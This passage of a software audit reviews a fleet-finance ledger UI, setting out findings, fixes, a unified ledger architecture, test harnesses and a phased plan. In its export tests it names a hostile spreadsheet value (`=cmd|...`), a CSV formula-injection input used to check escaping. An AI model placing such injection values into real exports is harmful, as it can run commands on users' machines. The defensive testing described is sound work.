| F-13 | S2 | Performance / Architecture | `toll_controller.tsx:9903-10079`; `loadAllByPrefix("trip:")` uncapped | Every Toll tab open loads all tolls + all trips into an edge worker and runs O(unmatched × trips) matching. | Split listing from reconciliation. Add `GET /toll-ledger` — paged, filtered, no suggestions. Keep the export endpoint for exports. | L |
| F-14 | S2 | UX / Workflow | No router integration anywhere in the section | No deep links, no shareable investigations, no browser back. Tab switch destroys all state. | Put tab, filters, page, sort and expanded row in the URL query string. Lift state above the tab boundary. | M |
| F-15 | S2 | Correctness / UX | `TripLedgerPage.tsx:13-22`; screenshot shows 11 of 13 default columns | New default columns never reach existing users — including `Lines Match`, the integrity flag. | Version the localStorage schema; on version bump, union in newly-added `defaultVisible` keys. | S |
| F-16 | S2 | Correctness | `TripLedgerFilterBar.tsx:150-156` | Changing a chip within 350ms of typing silently reverts it. | Functional update (`onChange(prev => ...)`) or debounce only the search value. | S |
| F-17 | S2 | Consistency / Redundancy | `components/trips/TripLogsPage.tsx` vs this section | Two trip lists, different stack, different numbers, no stated authority. | Decide which is canonical. Fold the other into it as a saved view. | L |
| F-18 | S3 | Performance | `App.tsx:17` static import; ~110KB+ of ledger code | Ships to every user including those without `nav.transaction_list`. | `React.lazy` + `Suspense`, matching sibling desks. | S |
| F-19 | S3 | Architecture / Scale | `FuelLedgerPage.tsx:150-193`, `TollLedgerPage.tsx:110-193` | Full dataset in browser memory; unusable past ~10k rows. | Server-side filter/sort/paginate for Fuel and Toll, same contract as Trip. | L |
| F-20 | S3 | Performance | `count:'exact'` on every request; `SELECT *` + full `payload_json` | Full count scan per keystroke; whole blob on the wire for 11 visible columns. | Approximate counts past a threshold; projection-based select. | M |
| F-21 | S3 | Accessibility | §6.3 | Sorting and row expansion are keyboard- and SR-inaccessible; heading order inverted; no `aria-sort`. | `<button>` inside `<th>` + `aria-sort`; `role`/`tabIndex`/key handlers on rows; fix `h1`/`h2`; `role="tablist"`; live region for result count. | M |
| F-22 | S3 | UX | `TripLedgerTable.tsx:994-1003` | Empty state blames missing imports when the user simply filtered narrowly. | Branch on `hasActiveFilters` → "No trips match these filters" + Clear button. | S |
| F-23 | S3 | Performance | `TripLedgerTable.tsx`, no virtualization; `loading` prop on every row | 5,500 cells re-render twice per interaction at 100 rows. | Virtualize past 50 rows; move `loading` out of `DataRow`. | M |
| F-24 | S3 | Architecture | Trip/Fuel/Toll use raw `useState`+`useEffect`; Statement uses react-query | No cache, no `keepPreviousData`, no request cancellation, three race-guard styles. | Standardize on react-query with a shared `useLedgerQuery`. | M |
| F-25 | S3 | Security / Tenancy | `baseRepo.ts:112-116` `orOrg` includes `IS NULL` and `roam-default-org` | Null-org and default-org rows visible to every tenant (given A1). | Audit both buckets; backfill; enable `STRICT_ORG_FILTER`. | M |
| F-26 | S3 | Data model | `fleet.trips`: 9 typed columns, 55 displayed fields | Only 9 fields are ever filterable/sortable; typed mirror can drift from `payload_json` with no control. | Promote the financial fields the ledger filters/sorts/totals on to typed columns; add a drift check. | L |
| F-27 | S3 | Correctness | `TripLedgerStats.tsx:72`; screenshot shows `$0.00` cancelled rows | Cancelled trips drag "Avg Trip Amount" toward zero. | Exclude non-completed from monetary averages; label the denominator. | S |
| F-28 | S3 | Consistency | Filter offers 8 platforms; Statement knows 3; server rewrites `GoRide`→`Roam` | Selecting "GoRide" returns rows labelled "Roam" or nothing. | One platform registry shared by filter, badge, and statement tabs; drop `GoRide` from user-facing options. | S |
| F-29 | S3 | Observability | No correlation id, no typed errors, no client telemetry in the section | "It showed the wrong number" is undiagnosable after the fact. | §12. | M |
| F-30 | S4 | Export quality | `\n` line endings, no BOM, filename is date-only | Excel mangles non-ASCII; exports are indistinguishable after download. | `\r\n`, UTF-8 BOM, filter context + timestamp in filename. | S |
| F-31 | S4 | Performance / UX | `thead` `sticky top-0` inside an `overflow-x-auto` with no height | Header scrolls away after ~20 rows. | Constrain container height; keep header sticky; freeze the ID column. | S |
| F-32 | S4 | Code quality | `TabbedTransactionList.tsx:19` dead `loading`; `TransactionsPage` dead `mode='analytics'`; `mergeTripLedgerActiveColumns` ignores saved order | Dead branches, non-reorderable columns. | Delete dead code; honor saved column order. | S |
| F-33 | S4 | Consistency | `columnConfig` honored in `CustomerLedgerView`, ignored by `TabbedTransactionList` | Super-Admin column labels differ between the two views of the same data. | Pass org column config through in both. | S |
| F-34 | S4 | i18n / Config | `Intl.NumberFormat('en-US', {currency:'USD'})` hardcoded throughout; km/km-h hardcoded | No multi-currency or unit support. | Currency + units from org config. | M |

---

## 9. Quick wins (1–3 days)

Ordered so each is independently shippable and independently verifiable.

1. **F-01 — Unbreak search.** Add `ilike` to the bridge's method list and translation; wildcard the term; add trip-ID matching. *Highest value per hour in the whole audit — it turns a dead control into the desk's primary tool.*
2. **F-02 — Stop printing gross as net.** Delete the fallback; render `—` when net is unknown; add the InDrive resolver. *Removes the section's most visible wrong number.*
3. **F-04 (partial) — Add `, id DESC` to the sort.** One clause. Makes pagination deterministic and ends silent row loss. *Do this before anything else touches paging.*
4. **F-07 — Neutralize CSV formulas.** Six lines in three export files plus a hostile-input test.
5. **F-15 — Version the column preference.** Restores `Lines Match` and `Cash Collected` for every existing user.
6. **F-16 — Fix the debounce closure.** One-line functional update.
7. **F-03 (mitigation) — Badge or disable page-local sort** on the Trip tab until server sort lands. Honesty now, correctness in sprint 2.
8. **F-08 (mitigation) — Relabel Export → "Export this page (50)"** and surface "3,330 rows match — page export only."
9. **F-22 — Filter-aware empty state.**
10. **F-18 — Lazy-load the desk.**
11. **F-27 — Exclude cancelled from monetary averages.**
12. **The rename** (§9.1) — label-only, low risk, ships with any of the above.

### 9.1 Renaming the section

"Transaction List" is wrong on both words: the tabs are ledgers, not a flat transaction feed, and three of the four are not lists at all (Statement Summary is an aggregation).

| Candidate | Assessment |
|---|---|
| **Ledgers** ✅ **recommended** | Matches what the tabs are literally called (Trip Ledger, Fuel Ledger, Toll Ledger). Plural is honest about there being four. Short, scannable in a sidebar that already has "Bank Deposits" and "Driver Settlements". |
| **Ledger Explorer** | Good if you adopt the §11 read model, where one table is genuinely explored rather than four tabs browsed. Slightly long for the sidebar. |
| **Transaction Explorer** | Keeps "Transaction" continuity while signalling investigation over browsing. Weaker if you keep the Statement Summary tab. |
| ~~General Ledger~~ | **Avoid.** In accounting, a General Ledger is the double-entry book of account. This is a set of operational sub-ledgers with no GL semantics. Naming it GL will set an expectation you would then have to meet. |

**Recommendation: `Ledgers`.** Sidebar label, page `h1`, and the `BusinessFinanceDeskChrome` desk label. Subtitle: *"Trip, fuel, and toll records with full financial detail."*

**Do this as a display-label change only.** The page id `transaction-list` and the permission key `nav.transaction_list` are load-bearing across four apps and server RBAC:

```
apps/fleet/src/App.tsx:744,745        apps/fleet/.../AppSidebar.tsx:120,289-291
apps/fleet/.../WorkbenchHome.tsx:98   packages/auth-client/src/permissions.ts:254,350,400,582
apps/admin/src/utils/permissions.ts:144,223,263,484
apps/driver/src/utils/permissions.ts:144,223,263,420
supabase/functions/_fleet-server/rbac_middleware.ts:40,248,285
```

Renaming the key means migrating every persisted role grant. Change three display strings; leave the identifiers alone. Note in `permissions.ts` that `nav.transaction_list` now gates a section labelled "Ledgers."

---

## 10. Strategic improvements (1–2 quarters)

**Q1 — Make the Trip tab actually correct, then generalize it.**
- Server-side sort with a whitelist (F-03), keyset pagination (F-04), server-side stats including filtered money totals (F-12), server-streamed full export (F-08).
- Promote the fields the ledger filters/sorts/totals on to typed columns with indexes; add a payload-vs-column drift check (F-26).
- Extract the resulting contract into a shared `useLedgerQuery` on react-query (F-24), and a shared `<LedgerToolbar>` / `<LedgerTable>` with URL-backed state (F-14).
- Migrate Fuel onto that contract with a real paged endpoint (F-05, F-19).

**Q2 — Split reconciliation from listing; unify the read model.**
- New `GET /toll-ledger`: paged, filtered, suggestion-free (F-13). The reconciliation export endpoint stays, used only for exports.
- Introduce the unified ledger read model (§11) behind a feature flag; render one tab from it; verify against the legacy tab; migrate the rest.
- Resolve the duplicate trip list (F-17): one canonical implementation, the other becomes a saved view.
- Accessibility remediation to WCAG 2.1 AA (F-21).
- Saved views, column presets, density mode, frozen ID column, and drill-through from a row to driver / vehicle / settlement / batch.

---

## 11. Proposed architecture

### 11.1 The problem to solve
Four tabs, four backend shapes, four filter grammars, four money semantics, four exports. Every correctness fix must be made four times, and there is no shared definition of "a transaction" to be correct about.

### 11.2 Target: one ledger read model

A single canonical entry shape, materialized as a Postgres view (or a maintained table if the view cannot be indexed adequately):

```
ledger_entries
  entry_id          text PK        -- stable, unique: the pagination tiebreaker
  organization_id   text NOT NULL  -- never null; RLS anchor
  entry_type        enum           -- trip | fuel | toll | payout | adjustment
  source_system     text           -- uber | indrive | roam | rush | fuel_card | toll_tag | manual
  source_id         text           -- id in the originating system
  occurred_at       timestamptz    -- real event time, not a truncated date
  posted_at         timestamptz    -- when it entered the books
  period_key        text           -- the org's week/period, computed once, server-side
  driver_id, vehicle_id, batch_id  text
  direction         enum           -- inflow | outflow
  amount_gross      numeric(14,2)
  amount_net        numeric(14,2)  -- NULL when genuinely unknown. Never a gross fallback.
  currency          char(3)
  status            text
  integrity_flags   jsonb          -- lines_match, ssot_match, missing_activity, …
  payload_json      jsonb          -- type-specific detail for the expanded row
```

Indexes: `(organization_id, occurred_at DESC, entry_id DESC)`, `(organization_id, entry_type, occurred_at DESC)`, `(organization_id, driver_id, occurred_at DESC)`, `(organization_id, period_key)`.

### 11.3 One API, four verbs

```
POST /ledger/search   → { entries[], next_cursor, applied_filters }   keyset, never OFFSET
POST /ledger/stats    → { count, sum_gross, sum_net, by_type[], by_platform[] }  same filter body
POST /ledger/export   → streamed CSV/XLSX over the full filtered set, server-escaped
GET  /ledger/:id      → one entry with full lineage
```

**One filter body, shared by all four**, so the table, the KPI strip, and the export can never disagree — they are the same predicate evaluated three ways. The rule: *if an endpoint cannot express a filter, it returns 4xx; it never silently drops it.*

### 11.4 What the UI becomes
Tabs stop being separate applications and become **`entry_type` presets over one table**. Same toolbar, same period selector, same column system, same export, same URL grammar. Statement Summary stays as a distinct aggregation view — it is genuinely a different thing — but reads `period_key` from the same selector. A fifth tab, "All," becomes possible for the first time, and that is the view that answers "where did this week's money go."

### 11.5 Trade-offs

| Choice | For | Against |
|---|---|---|
| View vs. materialized table | View is always fresh, zero write path | May not meet latency at scale; materialization needs invalidation on every trip/fuel/toll write |
| Keyset vs. offset | Stable, O(1) deep pages, no dup/skip | No "jump to page 47"; UI must move to prev/next + "load more" |
| `amount_net` nullable | Honest; makes F-02 structurally impossible | Every consumer must handle `null` — that is the point |
| One table vs. per-domain | One fix fixes everything; cross-type views possible | A wide sparse table; type-specific columns live in `payload_json` |
| Big-bang vs. strangler | — | Strangler only; a big-bang cutover of a finance surface is not defensible |

### 11.6 Migration path (no UI rewrite, no cutover event)

**Phase 0 — Stop the bleeding (days).** Quick wins §9. Nothing structural. The section becomes honest even if not yet fast.

**Phase 1 — Contract first (2–3 wks).** Define the filter body and the entry shape as shared types. Reimplement `/trips/search` behind the new contract, keeping the old endpoint as a thin adapter. Build `useLedgerQuery` + URL state. Trip tab migrates. *Behavior visibly unchanged except: sort works, paging is stable, KPIs describe the filter, export is complete.*

**Phase 2 — Generalize (3–4 wks).** Fuel gets a real paged endpoint. Toll gets `GET /toll-ledger` split from reconciliation. Both migrate to the shared hook and toolbar. Three tabs, one implementation.

**Phase 3 — Unify (4–6 wks).** Introduce `ledger_entries` as a view over the three domains. Add `/ledger/search|stats|export`. Behind a flag, render one tab from it and run a **dual-read comparison job** asserting identical result sets against the legacy path. Migrate remaining tabs. Add the "All" tab.

**Phase 4 — Decommission.** Retire per-domain list endpoints. Retire `fromKvStore` for these paths. Delete the duplicate trip list (F-17).

Every phase ships independently and is reversible by flag.

---

## 12. Instrumentation and validation plan

The rule for this section: **every correctness fix gets an automated assertion, not a manual check.** These defects are all silent — they will come back silently too.

### 12.1 Correctness harnesses

**Completeness (proves F-04).** Against a seeded set with heavy same-day ties: page through the entire result set at page sizes 25/50/100, collect every `id`, assert the union equals the full set **and contains no duplicates**. Run at every page size, both sort directions. This test is the ledger's definition of correct.

**Stats agreement (proves F-12).** For N random filter combinations, assert `/ledger/stats` equals the aggregate of every page of `/ledger/search` — count, sum gross, sum net — to the cent.

**Net-income truth (proves F-02).** Golden fixtures per platform (Uber CSV, InDrive, Roam ride, Rush order, manual). Assert: InDrive net = gross − service fee; net is `null`, never gross, when unknowable. Assert the same resolver feeds table, KPI and export.

**Export fidelity (proves F-07, F-08, F-30).** Byte-for-byte golden CSV including a hostile driver name (`=cmd|...`), a comma-and-quote name, and a non-ASCII name. Assert the export row count equals the filtered total, not the page.

**Filter fidelity (proves F-10).** A Deno test that runs **every filter shape the production UI can emit** through `fleet_sql_bridge` and asserts no `[fleetSqlBridge] unmapped` warning is produced. Make that warning a hard failure in CI.

**Search (proves F-01).** Assert 200 + correct rows for: partial driver name, full name, different case, name with a comma, full trip ID, partial trip ID, empty string, and 500 characters of junk.

### 12.2 Runtime telemetry

Server — structured log per ledger request: `{request_id, org_id, entry_type, filter_hash, row_count, total_count, truncated, db_ms, total_ms}`. Dashboards on p50/p95/p99 by endpoint, truncation rate, and — as a standing alert — **any request where a filter was dropped** (should be zero by construction after F-10).

Client — mark `filter_change → first_row_painted`; report INP on the table and the filter bar; track error rate by endpoint with `request_id` echoed into the error card so a user-reported "wrong number" is traceable.

### 12.3 Proving each fix

| Fix | Proof |
|---|---|
| F-01 | Search test suite green; 5xx rate on `/trips/search` → 0; search usage appears in telemetry (it is currently 100% failure, so *any* success is the signal) |
| F-02 | Golden fixtures green; on the dashboard, `sum_net < sum_gross` for any filter containing InDrive trips — today they are equal |
| F-03 | Sort-correctness test: top-10-by-amount from the API equals top-10 from a direct SQL query over the full filtered set |
| F-04 | Completeness harness green at all page sizes; zero duplicate `entry_id` across a full pagination sweep |
| F-05 | Fuel tab requests carry explicit dates; `truncated` flag surfaces in the UI; a 2-year-range query returns > one week of rows |
| F-06 | Toll fixture where the trip has no `tollCharges` → `lossAmount` is `null`/`unknown`, not the full toll |
| F-07 | Hostile-name golden file; manual open in Excel shows a literal string |
| F-08 | Export row count == filtered total in the fidelity test |
| F-10 | CI fails on any unmapped-filter warning |
| F-15 | Fresh profile with a stale 11-key preference → after load, `Lines Match` and `Cash Collected` are present |
| F-21 | axe-core clean on the section; manual keyboard walkthrough: sort and expand reachable by Tab + Enter |

### 12.4 Suggested SLOs (you did not supply targets — these are proposals)
| Metric | Target |
|---|---|
| `/ledger/search` p95 (50 rows, filtered) | ≤ 400 ms server |
| `/ledger/stats` p95 | ≤ 600 ms server |
| Filter change → rows painted, p95 | ≤ 1.2 s |
| Table INP | ≤ 200 ms |
| Export, 100k rows | ≤ 30 s, streamed, with progress |
| Pagination duplicate/skip rate | **0** — non-negotiable |
| Silently dropped filters | **0** — non-negotiable |

---

## 13. Open questions and data to collect

**Blocking — these change the recommendations:**

1. **Is `FEATURE_FLAGS.STRICT_ORG_FILTER` on in production?** (assumption A1) Drives F-25 severity. — `SELECT * FROM feature_flags WHERE key LIKE '%strict_org%';`
2. **What are the real row counts?** `SELECT count(*) FROM fleet.trips;` and equivalents for fuel entries and toll ledger. Decides whether F-19 is urgent or merely inevitable.
3. **How many trips have `payload_json->>'netToDriver'` null, by platform?** Sizes the blast radius of F-02 precisely.
   ```sql
   SELECT platform,
          count(*) AS total,
          count(*) FILTER (WHERE payload_json->>'netToDriver' IS NULL) AS missing_net
   FROM fleet.trips GROUP BY platform ORDER BY 2 DESC;
   ```
4. **What is in the null-org and `roam-default-org` buckets?** `SELECT organization_id, count(*) FROM fleet.trips GROUP BY 1;` Decides whether F-25 is a leak or a cleanup.
5. **Does `fleet.trips.amount` match `payload_json->>'amount'`?**
   ```sql
   SELECT count(*) FROM fleet.trips
   WHERE amount IS DISTINCT FROM (payload_json->>'amount')::numeric;
   ```
   A non-zero answer means the filter/sort mirror has drifted from what users see, and F-26 becomes urgent.

**Important — needed to prioritize:**

6. **What are your actual SLOs?** The Context block in your brief was blank. §12.4 is my proposal, not your requirement.
7. **Who uses this and for what, exactly?** Weekly close? Dispute investigation? Audit evidence? If disputes are the driver, F-14 (URL state) jumps above several S2s.
8. **Which trip list is canonical — this one or `TripLogsPage`?** (F-17) I cannot decide this for you; it is a product call.
9. **Does `/statement-summary` double-count?** If a trip contributes to both a platform statement and Roam, "Combined Totals" over-reports. I did not audit that endpoint (out of scope) but the tab that renders it is in scope.
10. **Any constraints I should know about?** Deadlines, no-schema-change rules, UI-freeze requirements — all blank in your brief. §11 assumes schema changes are permitted; say so if they are not and I will rework the migration around views only.

**Useful telemetry to capture before starting:**

11. A HAR capture of: first load, one filter change, one page-forward, one sort, one export.
12. `EXPLAIN (ANALYZE, BUFFERS)` for the `/trips/search` query at offset 0 and at offset 3000.
13. Edge function logs for one `GET /toll-reconciliation/export` — wall time, memory, and whether `WORKER_RESOURCE_LIMIT` has been hit.
14. A `grep` of production logs for `[fleetSqlBridge] unmapped` — that count is the number of times a filter has already been silently dropped.

---

## 14. Prioritized implementation order

Work top to bottom. Each block is independently shippable and independently verifiable.

### Block 0 — Stop lying to the user (days 1–3)
| # | Finding | Why first |
|---|---|---|
| 1 | **F-01** Fix `ilike` in the bridge | The search box is dead. Nothing else matters while the primary control 500s. |
| 2 | **F-04a** Add `, id DESC` to the sort | One clause; ends silent row loss. Must precede any paging work. |
| 3 | **F-02** Remove the gross→net fallback | The most visible wrong number on the screen. |
| 4 | **F-07** CSV formula escaping | Security, and it is six lines. |
| 5 | **F-15** Version the column preference | Restores the integrity columns everyone is missing. |
| 6 | **F-16** Fix the debounce closure | One line. |
| 7 | **F-03m / F-08m** Label page-local sort and page-scoped export honestly | Honesty now; correctness in Block 2. |
| 8 | **F-22** Filter-aware empty state · **F-27** Exclude cancelled from averages · **F-18** Lazy-load · **Rename → "Ledgers"** | Cheap, visible, no risk. |

### Block 1 — Stop failing silently (week 2)
| # | Finding | Why |
|---|---|---|
| 9 | **F-10** Unmapped filters throw instead of skipping | Every later fix depends on the server meaning what it says. Do this before F-09. |
| 10 | **F-05** Fuel: explicit dates, limit, truncation banner | Largest remaining silent-truncation surface. |
| 11 | **F-06** Toll: distinguish "unknown" from "zero" | Removes phantom losses. |
| 12 | **F-29** Correlation ids + structured ledger request logs | You cannot validate Blocks 2–4 without this. |
| 13 | **§12.1** Land the completeness + stats-agreement harnesses | Turn every fix above into a permanent assertion. |

### Block 2 — Make the numbers real (weeks 3–6)
| # | Finding |
|---|---|
| 14 | **F-03** Server-side sort with a column whitelist |
| 15 | **F-12** Server-side stats; add **filtered total Amount and total Net** |
| 16 | **F-08** Server-streamed export over the full filtered set |
| 17 | **F-04b** Keyset pagination |
| 18 | **F-09** Wire service-line scope (safe only after F-10) |
| 19 | **F-24** Shared `useLedgerQuery` on react-query · **F-14** URL-backed state |

### Block 3 — Make it consistent (weeks 7–12)
| # | Finding |
|---|---|
| 20 | **F-11** One period selector across all tabs |
| 21 | **F-19** Server-side Fuel paging · **F-13** split `GET /toll-ledger` from reconciliation |
| 22 | **F-21** Accessibility to WCAG 2.1 AA |
| 23 | **F-23** Virtualization · **F-20** count/projection tuning · **F-31** sticky header + frozen ID column |
| 24 | **F-28** Unified platform registry · **F-33** shared column config · **F-32** dead code · **F-30** export quality |

### Block 4 — Make it one system (quarter 2)
| # | Finding |
|---|---|
| 25 | **F-26** Promote financial fields to typed columns + drift check |
| 26 | **§11** `ledger_entries` read model + `/ledger/*` API behind a flag, with dual-read comparison |
| 27 | **F-25** Close the null-org / default-org buckets; enable `STRICT_ORG_FILTER` |
| 28 | **F-17** Resolve the duplicate trip list |
| 29 | **F-34** Currency and units from org config |
| 30 | Saved views, drill-through, the "All" tab |

---

### Closing note

The visual design of this section is good — the density, the badge system, the expandable detail row, the column toggle, and the Statement Summary tab are all the right instincts, and none of that needs to be thrown away. What is missing is underneath: a definition of what a ledger entry is, a contract that refuses to silently return the wrong rows, and the discipline that the number in the KPI card, the number in the table, and the number in the CSV are the same number computed once.

Block 0 takes roughly three days and removes every defect that is currently telling a user something false. I would start there regardless of what you decide about §11.
